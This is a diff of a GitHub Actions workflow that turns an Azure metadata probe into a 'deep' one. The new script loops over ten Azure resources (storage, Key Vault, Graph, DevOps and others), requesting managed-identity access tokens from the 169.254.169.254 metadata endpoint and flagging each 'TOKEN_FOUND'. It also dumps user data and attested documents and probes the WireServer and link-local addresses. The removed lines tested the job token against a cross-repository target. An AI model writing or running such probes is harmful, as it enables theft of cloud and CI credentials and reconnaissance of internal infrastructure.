@@ -1,44 +1,72 @@
-name: azure-imds-probe
+name: deep-imds-probe
 on:
   workflow_dispatch:
 permissions:
   contents: read
 jobs:
-  imds:
+  deep-imds:
     runs-on: ubuntu-latest
     steps:
-      - name: probe-imds
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: deep-probe
         run: |
-          echo "=== Azure IMDS Instance Metadata ==="
-          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" --max-time 5 | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({k:d.get(k,'N/A') for k in ['compute']}, indent=2)[:2000])" 2>/dev/null || echo "IMDS_INSTANCE_FAILED"
+          IMDS="http://169.254.169.254"
+          HDR="Metadata:true"
+          API="api-version=2021-12-13"
+          
+          echo "=== 1. MANAGED IDENTITY TOKENS FOR DIFFERENT RESOURCES ==="
+          for resource in \
+            "https://storage.azure.com/" \
+            "https://vault.azure.net" \
+            "https://graph.microsoft.com/" \
+            "https://management.core.windows.net/" \
+            "https://database.windows.net/" \
+            "https://azurecr.io" \
+            "https://app.vstoken.visualstudio.com" \
+            "https://dev.azure.com" \
+            "https://containerregistry.azure.net" \
+            "https://cognitiveservices.azure.com"; do
+            echo -n "  $resource: "
+            RESP=$(curl -sS -H "$HDR" "$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resource" --max-time 3 2>/dev/null)
+            if echo "$RESP" | grep -q "access_token"; then
+              echo "TOKEN_FOUND! $(echo $RESP | python3 -c 'import sys,json;t=json.load(sys.stdin);print(f"type={t.get(\"token_type\")}, expires={t.get(\"expires_on\")}, resource={t.get(\"resource\")}")' 2>/dev/null)"
+            else
+              echo "$(echo $RESP | python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"error_description\",\"unknown\")[:80])' 2>/dev/null)"
+            fi
+          done
           
           echo ""
-          echo "=== Azure IMDS Managed Identity Token ==="
-          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --max-time 5 2>/dev/null | head -c 500
+          echo "=== 2. IMDS SCHEDULED EVENTS ==="
+          curl -sS -H "$HDR" "$IMDS/metadata/scheduledevents?$API" --max-time 3 2>/dev/null | head -c 500
           echo ""
           
           echo ""
-          echo "=== IMDS Network ==="
-          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-12-13" --max-time 5 2>/dev/null | head -c 500
+          echo "=== 3. IMDS ATTESTED DATA ==="
+          curl -sS -H "$HDR" "$IMDS/metadata/attested/document?$API" --max-time 3 2>/dev/null | head -c 500
           echo ""
           
           echo ""
-          echo "=== IMDS Tags ==="
-          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-12-13" --max-time 5 2>/dev/null | head -c 500
+          echo "=== 4. IMDS USER DATA ==="
+          curl -sS -H "$HDR" "$IMDS/metadata/instance/compute/userData?$API&format=text" --max-time 3 2>/dev/null | head -c 200
           echo ""
           
           echo ""
-          echo "=== GITHUB_TOKEN test (correct way) ==="
-          echo -n "REST /user: "
-          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/user"
+          echo "=== 5. IMDS VERSIONS ==="
+          curl -sS -H "$HDR" "$IMDS/metadata/versions" --max-time 3 2>/dev/null | head -c 300
           echo ""
-          echo -n "REST /repos/current: "
-          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY"
+          
           echo ""
-          echo -n "REST /repos/cross-repo: "
-          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/toofikz4/disc-secret"
+          echo "=== 6. WIRESERVER (168.63.129.16) DEEP ==="
+          echo -n "  Port 80 HTTP: "
+          curl -s -o /dev/null -w "%{http_code}" "http://168.63.129.16/" --max-time 2 2>/dev/null || echo "timeout"
           echo ""
-          echo "Scopes:"
-          curl -sI -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/" | grep -i x-oauth-scopes
+          echo -n "  Port 32526 (health): "
+          curl -s -o /dev/null -w "%{http_code}" "http://168.63.129.16:32526/status" --max-time 2 2>/dev/null || echo "timeout"
+          echo ""
+          
+          echo ""
+          echo "=== 7. LINK-LOCAL SERVICES ==="
+          for ip in 169.254.169.253 169.254.169.252 169.254.169.1; do
+            echo -n "  $ip: "
+            curl -s -o /dev/null -w "%{http_code}" "http://$ip/" --max-time 1 2>/dev/null || echo "timeout"
+            echo ""
+          done
